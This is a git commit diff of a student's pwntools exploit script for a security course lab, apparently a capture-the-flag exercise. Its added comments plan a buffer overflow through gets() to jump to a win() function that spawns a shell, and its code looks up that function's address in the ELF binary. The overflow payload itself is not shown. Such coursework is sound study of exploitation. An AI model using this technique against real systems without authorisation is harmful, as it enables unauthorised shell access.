43b9ab8531080e79a6b53cfaec4a161627a3244b
Joshua Bartholomew <joshua.bartholomew@trojans.dsu.edu>
2023-08-30 22:33:26 -0500

    Added docs and memory address lookup

--- lab2-1.py
+++ lab2-1.py
@@ -2,6 +2,19 @@ import pwn
 
 if __name__ == "__main__":
 
+    # Considering the similarity of this lab to lab1-2, I'm reusing a lot of my code.
+    # After looking at the lab2-1.c file, I noticed the "void win()" function.
+    # This function again calls "/bin/bash", allowing me to drop into a shell.
+
+    # In the "int main()" function, gets is called.
+    # This should allow me to jump to the win() function through a buffer overflow.
+
+    # First, I need to get the address of the win() function.
+    # I load the binary as an ELF file to analyse the symbols.
+    victim_binary = pwn.ELF("./lab2-1.bin")
+    # Then, I search for and capture the address.
+    win_function_address = victim_binary.symbols["win"]
+    
     # I run the process.
     # process_to_exploit = pwn.remote("csc748.hostbin.org", 7021)
     # This next line can replace the one above for testing against a local binary.
